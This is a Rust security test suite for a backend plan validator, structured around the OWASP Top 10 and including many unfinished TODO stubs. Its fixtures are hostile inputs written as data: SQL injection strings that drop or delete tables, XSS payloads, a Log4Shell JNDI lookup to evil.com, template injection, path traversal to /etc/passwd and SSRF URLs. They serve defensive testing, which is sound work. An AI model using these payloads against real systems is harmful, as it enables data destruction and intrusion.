use scribe_backend::{
    services::{
        planning::{
            PlanValidatorService,
            types::*,
        },
        EcsEntityManager,
    },
    models::chats::{ChatMessage, MessageRole},
    test_helpers::{spawn_app, TestDataGuard, db::create_test_user},
    PgPool,
};
use std::sync::Arc;
use uuid::Uuid;
use chrono::Utc;

/// Helper to create test entity manager
async fn create_test_entity_manager(db_pool: PgPool) -> Arc<EcsEntityManager> {
    let redis_client = Arc::new(
        redis::Client::open("redis://127.0.0.1:6379/")
            .expect("Failed to create Redis client for tests")
    );
    
    Arc::new(EcsEntityManager::new(
        db_pool.into(),
        redis_client,
        None,
    ))
}

/// Helper to create entities for different users (multi-tenant testing)
async fn create_multi_user_entities_for_repair(
    entity_manager: &Arc<EcsEntityManager>,
    db_pool: &PgPool,
) -> (Uuid, Uuid, Uuid, Uuid, Uuid, Uuid) {
    // Create two test users
    let user1 = create_test_user(db_pool, "repair_user1".to_string(), "password123".to_string()).await.unwrap();
    let user2 = create_test_user(db_pool, "repair_user2".to_string(), "password123".to_string()).await.unwrap();
    let user1_id = user1.id;
    let user2_id = user2.id;

    // User 1 entities
    let user1_character = entity_manager.create_entity(
        user1_id,
        Some(Uuid::new_v4()),
        "Name|Inventory|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "User1Character"})),
            ("Inventory".to_string(), serde_json::json!({"items": [], "capacity": 10})),
            ("Salience".to_string(), serde_json::json!({"tier": "Core", "scale_context": "character", "expiry": null})),
        ],
    ).await.unwrap();

    let user1_location = entity_manager.create_entity(
        user1_id,
        Some(Uuid::new_v4()),
        "Name|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "User1Location"})),
            ("Salience".to_string(), serde_json::json!({"tier": "Secondary", "scale_context": "location", "expiry": null})),
        ],
    ).await.unwrap();

    // User 2 entities
    let user2_character = entity_manager.create_entity(
        user2_id,
        Some(Uuid::new_v4()),
        "Name|Inventory|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "User2Character"})),
            ("Inventory".to_string(), serde_json::json!({"items": [], "capacity": 10})),
            ("Salience".to_string(), serde_json::json!({"tier": "Core", "scale_context": "character", "expiry": null})),
        ],
    ).await.unwrap();

    let user2_location = entity_manager.create_entity(
        user2_id,
        Some(Uuid::new_v4()),
        "Name|Salience".to_string(),
        vec![
            ("Name".to_string(), serde_json::json!({"name": "User2Location"})),
            ("Salience".to_string(), serde_json::json!({"tier": "Secondary", "scale_context": "location", "expiry": null})),
        ],
    ).await.unwrap();

    (user1_character.entity.id, user1_location.entity.id, 
     user2_character.entity.id, user2_location.entity.id, user1_id, user2_id)
}

/// Helper to create malicious chat messages for injection testing
fn create_malicious_chat_messages() -> Vec<ChatMessage> {
    vec![
        ChatMessage {
            id: Uuid::new_v4(),
            session_id: Uuid::new_v4(),
            user_id: Uuid::new_v4(),
            message_type: MessageRole::User,
            content: "'; DROP TABLE entities; -- <script>alert('xss')</script>".as_bytes().to_vec(),
            content_nonce: None,
            created_at: Utc::now(),
            prompt_tokens: None,
            completion_tokens: None,
            raw_prompt_ciphertext: None,
            raw_prompt_nonce: None,
            model_name: "test-model".to_string(),
        },
        ChatMessage {
            id: Uuid::new_v4(),
            session_id: Uuid::new_v4(),
            user_id: Uuid::new_v4(),
            message_type: MessageRole::Assistant,
            content: "${jndi:ldap://evil.com/a} {{7*7}} ' OR '1'='1".as_bytes().to_vec(),
            content_nonce: None,
            created_at: Utc::now(),
            prompt_tokens: None,
            completion_tokens: None,
            raw_prompt_ciphertext: None,
            raw_prompt_nonce: None,
            model_name: "test-model".to_string(),
        },
    ]
}

#[tokio::test]
async fn test_a01_broken_access_control_cross_user_repair_prevention() {
    // A01: Broken Access Control
    // Ensure users cannot create repair plans for entities they don't own
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let (_, _, user2_character, user2_location, user1_id, _user2_id) = 
        create_multi_user_entities_for_repair(&entity_manager, &test_app.db_pool).await;

    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);

    // User1 tries to create a repair plan involving User2's entities
    let malicious_plan = Plan {
        goal: "User1 attempts to repair User2's entity state".to_string(),
        actions: vec![
            PlannedAction {
                id: "malicious_repair".to_string(),
                name: ActionName::MoveEntity,
                parameters: serde_json::json!({
                    "entity_to_move": user2_character.to_string(),
                    "new_parent": user2_location.to_string(),
                }),
                preconditions: Preconditions {
                    entity_exists: Some(vec![
                        EntityExistenceCheck {
                            entity_id: Some(user2_character.to_string()),
                            entity_name: None,
                        },
                    ]),
                    ..Default::default()
                },
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(10),
            confidence: 0.9,
            alternative_considered: None,
        },
    };

    let chat_context = vec![
        ChatMessage {
            id: Uuid::new_v4(),
            session_id: Uuid::new_v4(),
            user_id: user1_id,
            message_type: MessageRole::User,
            content: "The character moves to the location.".as_bytes().to_vec(),
            content_nonce: None,
            created_at: Utc::now(),
            prompt_tokens: None,
            completion_tokens: None,
            raw_prompt_ciphertext: None,
            raw_prompt_nonce: None,
            model_name: "test-model".to_string(),
        },
    ];

    let result = validator.validate_plan(&malicious_plan, user1_id).await.unwrap();

    match result {
        PlanValidationResult::Invalid(invalid) => {
            // Should fail because user1 cannot access user2's entities
            assert!(invalid.failures.iter().any(|f| 
                f.failure_type == ValidationFailureType::EntityNotFound ||
                f.failure_type == ValidationFailureType::PermissionDenied
            ));
        }
        _ => panic!("Expected invalid plan due to cross-user access attempt"),
    }

    // TODO: When repair system is implemented, ensure it also respects user boundaries
    // Enhanced validation with repair should not generate repair plans for other users' entities
}

#[tokio::test]
async fn test_a01_broken_access_control_repair_ownership_validation() {
    // A01: Additional test ensuring repair actions respect entity ownership
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // TODO: Test that repair actions generated by the system always respect user ownership
    // Even if the original plan involves cross-user entities, repairs should not be generated
}

#[tokio::test]
async fn test_a02_cryptographic_failures_repair_data_encryption() {
    // A02: Cryptographic Failures
    // Ensure all repair analysis and generated actions use proper SessionDek encryption
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // TODO: Verify that:
    // 1. Chat context analysis uses encrypted user data
    // 2. ECS state queries for repair use SessionDek
    // 3. Generated repair actions are stored with proper encryption
    // 4. No plaintext sensitive data is logged during repair analysis
}

#[tokio::test]
async fn test_a03_injection_chat_context_sanitization() {
    // A03: Injection
    // Ensure chat context used in repair analysis is properly sanitized
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);

    // Create user and basic entity for testing
    let user = create_test_user(&test_app.db_pool, "injection_test_user".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;

    let malicious_chat = create_malicious_chat_messages();

    // Simple plan that would normally be valid
    let plan = Plan {
        goal: "Test injection resistance".to_string(),
        actions: vec![
            PlannedAction {
                id: "test_injection".to_string(),
                name: ActionName::FindEntity,
                parameters: serde_json::json!({
                    "criteria": {
                        "type": "ByName",
                        "name": "TestEntity"
                    }
                }),
                preconditions: Preconditions::default(),
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(5),
            confidence: 0.8,
            alternative_considered: None,
        },
    };

    // System should handle malicious chat context safely
    let result = validator.validate_plan(&plan, user_id).await;
    assert!(result.is_ok(), "Validator should handle malicious chat context safely");

    // TODO: When repair system is implemented:
    // 1. Pass malicious_chat to validate_plan_with_repair
    // 2. Verify no SQL injection occurs in repair analysis
    // 3. Verify no script injection in repair reasoning
    // 4. Ensure all user input is properly escaped
}

#[tokio::test]
async fn test_a03_injection_repair_parameter_sanitization() {
    // A03: Additional injection test for repair action parameters
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // TODO: Test that repair action parameters are properly sanitized:
    // 1. Entity names with SQL injection attempts
    // 2. Component data with script injection
    // 3. Relationship parameters with NoSQL injection
}

#[tokio::test]
async fn test_a04_insecure_design_repair_loop_prevention() {
    // A04: Insecure Design
    // Ensure repair system cannot create infinite loops or excessive resource usage
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // TODO: Test circular repair detection:
    // 1. Create scenario where repair A would require repair B
    // 2. And repair B would require repair A (circular dependency)
    // 3. Ensure system detects and prevents infinite repair loops
    // 4. Test resource limits (max repairs per plan, max analysis time)
}

#[tokio::test]
async fn test_a04_insecure_design_repair_confidence_thresholds() {
    // A04: Test that confidence thresholds prevent inappropriate repairs
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // TODO: Test that:
    // 1. Low confidence repairs are not performed
    // 2. Ambiguous scenarios don't trigger repairs
    // 3. System errs on side of caution for uncertain cases
}

#[tokio::test]
async fn test_a05_security_misconfiguration_error_message_sanitization() {
    // A05: Security Misconfiguration
    // Ensure repair error messages don't leak sensitive ECS state information
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);

    let user = create_test_user(&test_app.db_pool, "error_test_user".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;

    // Create plan that would reveal sensitive information in error messages
    let plan = Plan {
        goal: "Attempt to access sensitive entity".to_string(),
        actions: vec![
            PlannedAction {
                id: "sensitive_access".to_string(),
                name: ActionName::GetEntityDetails,
                parameters: serde_json::json!({
                    "entity_id": "00000000-0000-0000-0000-000000000001", // Sensitive system entity
                }),
                preconditions: Preconditions {
                    entity_exists: Some(vec![
                        EntityExistenceCheck {
                            entity_id: Some("00000000-0000-0000-0000-000000000001".to_string()),
                            entity_name: Some("AdminSecretEntity".to_string()),
                        }
                    ]),
                    ..Default::default()
                },
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(5),
            confidence: 0.9,
            alternative_considered: None,
        },
    };

    let result = validator.validate_plan(&plan, user_id).await.unwrap();

    match result {
        PlanValidationResult::Invalid(invalid) => {
            for failure in &invalid.failures {
                // Error messages should be generic and not reveal entity names or sensitive info
                assert!(!failure.message.contains("AdminSecretEntity"));
                assert!(!failure.message.contains("Secret"));
                assert!(!failure.message.contains("sensitive"));
                // Should use generic messages like "Entity not found" or "Access denied"
            }
        }
        _ => panic!("Expected invalid plan"),
    }
}

#[tokio::test]
async fn test_a06_vulnerable_components_dependency_validation() {
    // A06: Vulnerable and Outdated Components
    // Ensure repair system doesn't introduce vulnerable dependencies
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // This test verifies that the repair system uses only secure, validated components
    // and doesn't introduce new attack vectors through dependencies
    
    // TODO: Verify that:
    // 1. All crates used by repair system are up-to-date
    // 2. No external API calls that could introduce SSRF
    // 3. No dynamic code execution in repair logic
    // 4. Flash client usage follows secure patterns
}

#[tokio::test]
async fn test_a07_authentication_failures_user_context_validation() {
    // A07: Identification and Authentication Failures
    // Ensure repair system properly validates user context
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);

    // Test with invalid/null user ID
    let invalid_user_id = Uuid::nil();

    let plan = Plan {
        goal: "Test with invalid user".to_string(),
        actions: vec![
            PlannedAction {
                id: "invalid_user_test".to_string(),
                name: ActionName::CreateEntity,
                parameters: serde_json::json!({
                    "entity_name": "TestEntity",
                    "archetype_signature": "Name",
                    "salience_tier": "Core",
                }),
                preconditions: Preconditions::default(),
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(10),
            confidence: 0.8,
            alternative_considered: None,
        },
    };

    // Should handle invalid user gracefully without crashing
    let result = validator.validate_plan(&plan, invalid_user_id).await;
    assert!(result.is_ok());

    // TODO: When repair system is implemented:
    // 1. Test validate_plan_with_repair with invalid user ID
    // 2. Ensure no repairs are generated for invalid users
    // 3. Verify proper session validation throughout repair process
}

#[tokio::test]
async fn test_a08_data_integrity_repair_consistency_validation() {
    // A08: Software and Data Integrity Failures
    // Ensure repair actions maintain ECS data integrity
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // TODO: Test that repair actions:
    // 1. Don't create invalid entity relationships
    // 2. Maintain component schema consistency
    // 3. Preserve referential integrity between entities
    // 4. Don't corrupt existing valid ECS state
    // 5. Are validated before execution
}

#[tokio::test]
async fn test_a08_data_integrity_repair_transaction_safety() {
    // A08: Additional test for repair transaction safety
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // TODO: Test that:
    // 1. Repair actions are applied atomically
    // 2. Failed repairs don't leave partial state changes
    // 3. Concurrent repair attempts are handled safely
}

#[tokio::test]
async fn test_a09_logging_repair_security_event_logging() {
    // A09: Security Logging and Monitoring Failures
    // Ensure all repair decisions and actions are properly logged
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // TODO: Verify that repair system logs:
    // 1. All repair decisions with confidence scores
    // 2. User IDs associated with repair attempts
    // 3. Original plans vs generated repair plans
    // 4. Success/failure of repair executions
    // 5. Security-relevant events (access violations, suspicious patterns)
    
    // Log analysis should enable:
    // - Audit trails for security reviews
    // - Detection of malicious repair attempts
    // - Performance monitoring of repair system
}

#[tokio::test]
async fn test_a09_logging_repair_sensitive_data_protection() {
    // A09: Additional test ensuring logs don't contain sensitive data
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // TODO: Verify that logs:
    // 1. Don't contain plaintext entity data
    // 2. Don't contain user chat content verbatim
    // 3. Use entity IDs instead of names where possible
    // 4. Sanitize any user input before logging
}

#[tokio::test]
async fn test_a10_ssrf_repair_external_request_prevention() {
    // A10: Server-Side Request Forgery
    // Ensure repair system doesn't make unauthorized external requests
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);

    let user = create_test_user(&test_app.db_pool, "ssrf_test_user".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;

    // Create plan with potential SSRF vectors in entity names/parameters
    let ssrf_plan = Plan {
        goal: "Test SSRF prevention in repair".to_string(),
        actions: vec![
            PlannedAction {
                id: "ssrf_test".to_string(),
                name: ActionName::CreateEntity,
                parameters: serde_json::json!({
                    "entity_name": "http://evil.com/steal-data",
                    "archetype_signature": "Name",
                    "salience_tier": "Core",
                    "external_url": "http://internal-service/admin",
                    "file_reference": "file:///etc/passwd",
                }),
                preconditions: Preconditions::default(),
                effects: Effects::default(),
                dependencies: vec![],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(10),
            confidence: 0.8,
            alternative_considered: None,
        },
    };

    let chat_context = vec![
        ChatMessage {
            id: Uuid::new_v4(),
            session_id: Uuid::new_v4(),
            user_id: user_id,
            message_type: MessageRole::User,
            content: "Create entity at http://malicious-site.com/callback".as_bytes().to_vec(),
            content_nonce: None,
            created_at: Utc::now(),
            prompt_tokens: None,
            completion_tokens: None,
            raw_prompt_ciphertext: None,
            raw_prompt_nonce: None,
            model_name: "test-model".to_string(),
        },
    ];

    // Should validate without making external requests
    let result = validator.validate_plan(&ssrf_plan, user_id).await;
    assert!(result.is_ok(), "Should handle SSRF attempts safely");

    // TODO: When repair system is implemented:
    // 1. Ensure repair analysis doesn't make external HTTP requests
    // 2. Verify URL-like content in chat is treated as text, not endpoints
    // 3. Test that repair actions don't reference external resources
}

#[tokio::test]
async fn test_comprehensive_security_repair_attack_patterns() {
    // Comprehensive test combining multiple attack vectors in repair context
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_manager = create_test_entity_manager(test_app.db_pool.clone()).await;
    let redis_client = Arc::new(redis::Client::open("redis://127.0.0.1:6379/").unwrap());
    let validator = PlanValidatorService::new(entity_manager, redis_client);

    let user = create_test_user(&test_app.db_pool, "comprehensive_security_user".to_string(), "password123".to_string()).await.unwrap();
    let user_id = user.id;

    // Plan combining multiple attack vectors
    let complex_attack_plan = Plan {
        goal: "'; DROP TABLE plans; -- <script>alert('xss')</script> http://evil.com".to_string(),
        actions: vec![
            PlannedAction {
                id: "../../../etc/passwd".to_string(),
                name: ActionName::CreateEntity,
                parameters: serde_json::json!({
                    "entity_name": "{{7*7}}${jndi:ldap://evil.com/a}",
                    "archetype_signature": "Name|<img src=x onerror=alert(1)>",
                    "salience_tier": "Core",
                    "malicious_data": {
                        "$ref": "#/definitions/bomb",
                        "__proto__": {"isAdmin": true},
                        "webhook": "http://internal-server/admin"
                    }
                }),
                preconditions: Preconditions {
                    entity_exists: Some(vec![
                        EntityExistenceCheck {
                            entity_id: Some("' OR '1'='1".to_string()),
                            entity_name: Some("admin' --".to_string()),
                        }
                    ]),
                    ..Default::default()
                },
                effects: Effects::default(),
                dependencies: vec!["'; DELETE FROM entities WHERE '1'='1'; --".to_string()],
            }
        ],
        metadata: PlanMetadata {
            estimated_duration: Some(0),
            confidence: std::f32::INFINITY,
            alternative_considered: Some("1=1/**/OR/**/1=1".to_string()),
        },
    };

    let malicious_chat = create_malicious_chat_messages();

    // Should handle all attack vectors gracefully
    let result = validator.validate_plan(&complex_attack_plan, user_id).await;

    match result {
        Ok(_) => {
            // System processed the plan without security breaches
            // Malicious content should be treated as data, not executed
        }
        Err(e) => {
            // Error handling should not reveal system information
            let error_msg = e.to_string();
            assert!(!error_msg.contains("/home/"));
            assert!(!error_msg.contains("\\src\\"));
            assert!(!error_msg.contains("users"));
            assert!(!error_msg.contains("password"));
        }
    }

    // TODO: When repair system is implemented:
    // 1. Test that malicious chat context doesn't compromise repair analysis
    // 2. Verify repair actions aren't generated for malicious plans
    // 3. Ensure all malicious content is properly sanitized throughout
}